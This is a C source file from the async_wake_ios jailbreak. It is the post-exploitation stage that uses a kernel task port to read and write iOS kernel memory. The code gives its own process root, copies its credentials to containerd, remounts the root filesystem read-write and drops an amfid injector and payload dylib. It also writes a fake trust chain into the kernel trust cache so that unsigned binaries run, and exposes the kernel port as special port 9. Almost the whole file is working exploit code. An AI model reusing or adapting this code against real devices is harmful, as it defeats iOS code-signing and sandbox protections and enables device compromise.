//
//  fun.c
//  async_wake_ios
//
//  Created by George on 14/12/17.
//  Copyright © 2017 Ian Beer. All rights reserved.
//

#include "fun.h"
#include "kcall.h"
#include "bootstrap.h"
#include "procfinder.h"

char *itoa(long n)
{
	int len = n==0 ? 1 : floor(log10l(labs(n)))+1;
	if (n<0) len++; // room for negative sign '-'
	
	char    *buf = calloc(sizeof(char), len+1); // +1 for null
	snprintf(buf, len+1, "%ld", n);
	return   buf;
}

typedef struct {
	uint64_t prev;
	uint64_t next;
	uint64_t start;
	uint64_t end;
} kmap_hdr_t;

struct procs_info {
    uint64_t container_proc;
    pid_t amfid_pid;

    // shamelessly stolen from J's LiberTV :)
    uint64_t sysdiagnose_proc;
};

int procs_info_finder(uint64_t task, void *dat) {
    uint64_t proc = proc_for_task(task);
    if (proc == -1) return 0;
    struct procs_info* info = (struct procs_info*) dat;

    pid_t pid = (pid_t) rk32(proc + koffset(KSTRUCT_OFFSET_PROC_PID));
    char name[20] = {0};
    rkbuffer(proc + koffset(KSTRUCT_OFFSET_PROC_P_COMM), name, 16);
    if (strstr(name, "amfid")) {
        info->amfid_pid = pid;
    } else if (strstr(name, "container")) {
        info->container_proc = proc;
    } else if (strstr(name, "sysdiagnose")) {
        info->sysdiagnose_proc = proc;
    }

    return (info->amfid_pid && info->container_proc && info->sysdiagnose_proc);
}

uint64_t our_proc = 0;

int let_the_fun_begin(mach_port_t tfp0) {
    int err = 1;

	// Loads the kernel into the patch finder, which just fetches the kernel memory for patchfinder use
	init_kernel(find_kernel_base(), NULL);
	
//    dlopen(resourceInBundle("test.dylib"), RTLD_NOW);

	// Get the slide
	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
	printf("[fun] slide: 0x%016llx\n", slide);
	
//    kmap_hdr_t kernel_map;
//    rkbuffer(rk64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));

    #define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kcall(addr, 7, x0, x1, x2, x3, x4, x6, x6)
	
	// Get our and the kernels struct proc
    uint64_t kern_proc = proc_for_task(kerntask_for_pid(0));
    printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
    if (kern_proc == -1) {
        goto cleanup;
    }
    init_empower(kern_proc);

    uint32_t our_pid = getpid();
    our_proc = proc_for_task(kerntask_for_pid(our_pid));
    printf("[fun] our proc is at 0x%016llx\n", our_proc);
    if (our_proc == -1) {
        goto cleanup;
    }
    empower(our_proc, 1);

    struct procs_info info;
    bzero(&info, sizeof(info));

    enumerate_tasks(procs_info_finder, &info);

    printf("[fun] containerd proc is at 0x%016llx\n", info.container_proc);
    printf("[fun] sysdiagnose proc is at 0x%016llx\n", info.sysdiagnose_proc);
    printf("[fun] amfid pid is %u\n", info.amfid_pid);
    // why do we even need sysdiagnose?
    if (!(info.amfid_pid && info.container_proc)) {
        goto cleanup;
    }
	
    empower(info.container_proc, 0);

	// setuid(0) + test
	{
        // actually getuid() should force "sync" from what we've
        // written in empower and thus return 0
		printf("[fun] our uid was %d\n", getuid());
		
		setuid(0);
		
		printf("[fun] our uid is %d\n", getuid());
		
		FILE *f = fopen("/var/mobile/.root_fun", "w");
		if (f == 0) {
			printf("[fun] failed to write test file. something didn't work\n");
		} else {
			printf("[fun] wrote test file: %p\n", f);
		}
		fclose(f);
	}

	{
		printf("[fun] remounting: %d\n", mountroot());
		
		int fd = open("/.bit_of_fun", O_RDONLY);
		if (fd == -1) {
			fd = creat("/.bit_of_fun", 0644);
		} else {
			printf("[fun] file already exists!\n");
		}
		close(fd);
		
		printf("[fun] Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
        unlink("/.bit_of_fun");
	}
	
	// Prepare our binaries
	{
		if (!file_exist("/fun_bins")) {
			mkdir("/fun_bins", 0777);
		}
		
		/* uncomment if you need to replace the binaries */
		unlink("/fun_bins/inject_amfid");
		unlink("/fun_bins/amfid_payload.dylib");
        unlink("/fun_bins/test.dylib");

		if (!file_exist("/fun_bins/inject_amfid")) {
			cp(resourceInBundle("inject_amfid"), "/fun_bins/inject_amfid");
			chmod("/fun_bins/inject_amfid", 0777);
		}
		if (!file_exist("/fun_bins/amfid_payload.dylib")) {
			cp(resourceInBundle("amfid_payload.dylib"), "/fun_bins/amfid_payload.dylib");
			chmod("/fun_bins/amfid_payload.dylib", 0777);
		}
		if (!file_exist("/fun_bins/test.dylib")) {
			cp(resourceInBundle("test.dylib"), "/fun_bins/test.dylib");
			chmod("/fun_bins/test.dylib", 0777);
		}
		
		printf("[fun] copied the required binaries into the right places\n");
	}
	
	// trust cache injection
	{
		/*
		 Note this patch still came from @xerub's KPPless branch, but detailed below is kind of my adventures which I rediscovered most of what he did
		 
		 So, as said on twitter by @Morpheus______, iOS 11 now uses SHA256 for code signatures, rather than SHA1 like before.
		 What confuses me though is that I believe the overall CDHash is SHA1, but each subhash is SHA256. In AMFI.kext, the memcmp
		 used to check between the current hash and the hashes in the cache seem to be this CDHash. So the question is do I really need
		 to get every hash, or just the main CDHash and insert that one into the trust chain?
		 
		 If we look at the trust chain code checker (0xFFFFFFF00637B3E8 6+ 11.1.2), it is pretty basic. The trust chain is in the format of
		 the following (struct from xerub, but I've checked with AMFI that it is the case):
		 
		 struct trust_mem {
		 uint64_t next; 				// +0x00 - the next struct trust_mem
		 unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
		 unsigned int count;			// +0x18 - Number of hashes there are
		 unsigned char hashes[];		// +0x1C - The hashes
		 }
		 
		 The trust chain checker does the following:
		 - Find the first struct that has a count > 0
		 - Loop through all the hashes in the struct, comparing with the current hash
		 - Keeps going through each chain, then when next is 0, it finishes
		 
		 UPDATE: a) was using an old version of JTool. Now I realised the CDHash is SHA256
		 b) For launchd (whose hash resides in the AMFI cache), the first byte is used as an index sort of thing, and the next *19* bytes are used for the check
		 This probably means that only the first 20 bytes of the CDHash are used in the trust cache check
		 
		 So our execution method is as follows:
		 - Calculate the CD Hashes for the target resources that we want to play around with
		 - Create a custom trust chain struct, and insert it into the existing trust chain - only storing the first 20 bytes of each hash
		 - ??? PROFIT
		 */
		
		uint64_t tc = find_trustcache();
		printf("[fun] trust cache at: %016llx\n", rk64(tc));
		
		typedef char hash_t[20];
		
		struct trust_chain {
			uint64_t next; 				// +0x00 - the next struct trust_mem
			unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
			unsigned int count;			// +0x18 - Number of hashes there are
			hash_t hash[10];		    // +0x1C - The hashes
		};
		
		struct trust_chain fake_chain;
		
		fake_chain.next = rk64(tc);
		*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
		*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
		fake_chain.count = 2;

        const char *injectthese[] = {
            ("/fun_bins/inject_amfid"),
            ("/fun_bins/amfid_payload.dylib"),
        };
        size_t injectthese_size = sizeof(injectthese)/sizeof(injectthese[0]);

        for (int i = 0; i != injectthese_size; ++i) {
            uint8_t *hash = get_sha256(get_code_directory(injectthese[i]));
            memmove(fake_chain.hash[i], hash, sizeof(hash_t));
            free(hash);
        }

		uint64_t kernel_trust = kmem_alloc(sizeof(fake_chain));
		wkbuffer(kernel_trust, &fake_chain, sizeof(fake_chain));
		wk64(tc, kernel_trust);
		
		printf("[fun] Wrote the signatures into the trust cache!\n");
	}
	
    const char* BinaryLocation = "/fun_bins/inject_amfid";
	startprog(STARTPROG_WAIT, BinaryLocation, (const char*[]){BinaryLocation, itoa(info.amfid_pid), NULL}, NULL);

    {
        kern_return_t rv = task_set_special_port(mach_task_self(), 9, tfp0);
        printf("set special port 9: %x (%s)\n", rv, mach_error_string(rv));
    }

    err = 0;

	// Cleanup

cleanup:;
//    wk64(rk64(kern_ucred+0x78)+0x8, 0);
    term_kernel();

    return err;
}
